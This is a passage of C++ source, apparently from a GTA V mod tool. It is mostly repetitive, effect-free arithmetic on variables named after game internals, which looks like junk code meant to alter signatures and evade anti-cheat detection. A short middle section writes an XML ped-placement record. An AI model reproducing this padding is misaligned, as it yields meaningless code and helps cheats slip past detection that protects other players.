				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::LOG::arquivoTXT = XMLPath;
			Extern_Reader::LOG::LogSemHora("<Placement>");
			Extern_Reader::LOG::LogSemHora("<ModelHash>" + to_string(Estrutura.Hash) + "</ModelHash>");
			Extern_Reader::LOG::LogSemHora("<Type>1</Type>");
			Extern_Reader::LOG::LogSemHora("<Dynamic>true</Dynamic>");
			Extern_Reader::LOG::LogSemHora("<FrozenPos>false</FrozenPos>");
			Extern_Reader::LOG::LogSemHora("<HashName>" + Estrutura.Model + "</HashName>");
			Extern_Reader::LOG::LogSemHora("<InitialHandle>92935</InitialHandle>");
			Extern_Reader::LOG::LogSemHora("<PedProperties>");
			Extern_Reader::LOG::LogSemHora("<IsStill>false</IsStill>");
			Extern_Reader::LOG::LogSemHora("<CanRagdoll>true</CanRagdoll>");
			Extern_Reader::LOG::LogSemHora("<HasShortHeight>false</HasShortHeight>");
			Extern_Reader::LOG::LogSemHora("<Armour>0</Armour>");
			Extern_Reader::LOG::LogSemHora("<CurrentWeapon>0xA2719263</CurrentWeapon>");
			Extern_Reader::LOG::LogSemHora("<PedProps>");
			Extern_Reader::LOG::LogSemHora("<_0>-1,-1</_0>");
			Extern_Reader::LOG::LogSemHora("<_1>0,0</_1>");
			Extern_Reader::LOG::LogSemHora("<_2>-1,-1</_2>");
			Extern_Reader::LOG::LogSemHora("<_3>-1,-1</_3>");
			Extern_Reader::LOG::LogSemHora("<_4>-1,-1</_4>");
			Extern_Reader::LOG::LogSemHora("<_5>-1,-1</_5>");
			Extern_Reader::LOG::LogSemHora("<_6>-1,-1</_6>");
			Extern_Reader::LOG::LogSemHora("<_7>-1,-1</_7>");
			Extern_Reader::LOG::LogSemHora("<_8>-1,-1</_8>");
			Extern_Reader::LOG::LogSemHora("<_9>-1,-1</_9>");
			Extern_Reader::LOG::LogSemHora("</PedProps>");
			Extern_Reader::LOG::LogSemHora("<PedComps>");
			Extern_Reader::LOG::LogSemHora("<_0>0,0</_0>");
			Extern_Reader::LOG::LogSemHora("<_1>0,0</_1>");
			Extern_Reader::LOG::LogSemHora("<_2>0,0</_2>");
			Extern_Reader::LOG::LogSemHora("<_3>0,0</_3>");
			Extern_Reader::LOG::LogSemHora("<_4>0,0</_4>");
			Extern_Reader::LOG::LogSemHora("<_5>0,0</_5>");
			Extern_Reader::LOG::LogSemHora("<_6>0,0</_6>");
			Extern_Reader::LOG::LogSemHora("<_7>0,0</_7>");
			Extern_Reader::LOG::LogSemHora("<_8>0,0</_8>");
			Extern_Reader::LOG::LogSemHora("<_9>0,0</_9>");
			Extern_Reader::LOG::LogSemHora("<_10>0,0</_10>");
			Extern_Reader::LOG::LogSemHora("<_11>0,0</_11>");
			Extern_Reader::LOG::LogSemHora("</PedComps>");
			Extern_Reader::LOG::LogSemHora("<RelationshipGroupAltered>false</RelationshipGroupAltered>");
			Extern_Reader::LOG::LogSemHora("<RelationshipGroup>0xfade4843</RelationshipGroup>");
			Extern_Reader::LOG::LogSemHora("<ScenarioActive>true</ScenarioActive>");
			Extern_Reader::LOG::LogSemHora("<ScenarioName>WORLD_HUMAN_DRUG_DEALER_HARD</ScenarioName>");
			Extern_Reader::LOG::LogSemHora("<AnimActive>false</AnimActive>");
			Extern_Reader::LOG::LogSemHora("</PedProperties>");
			Extern_Reader::LOG::LogSemHora("<OpacityLevel>255</OpacityLevel>");
			Extern_Reader::LOG::LogSemHora("<LodDistance>240</LodDistance>");
			Extern_Reader::LOG::LogSemHora("<IsVisible>true</IsVisible>");
			Extern_Reader::LOG::LogSemHora("<MaxHealth>200</MaxHealth>");
			Extern_Reader::LOG::LogSemHora("<Health>200</Health>");
			Extern_Reader::LOG::LogSemHora("<HasGravity>true</HasGravity>");
			Extern_Reader::LOG::LogSemHora("<IsOnFire>false</IsOnFire>");
			Extern_Reader::LOG::LogSemHora("<IsInvincible>false</IsInvincible>");
			Extern_Reader::LOG::LogSemHora("<IsBulletProof>false</IsBulletProof>");
			Extern_Reader::LOG::LogSemHora("<IsCollisionProof>false</IsCollisionProof>");
			Extern_Reader::LOG::LogSemHora("<IsExplosionProof>false</IsExplosionProof>");
			Extern_Reader::LOG::LogSemHora("<IsFireProof>false</IsFireProof>");
			Extern_Reader::LOG::LogSemHora("<IsMeleeProof>false</IsMeleeProof>");
			Extern_Reader::LOG::LogSemHora("<IsOnlyDamagedByPlayer>false</IsOnlyDamagedByPlayer>");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
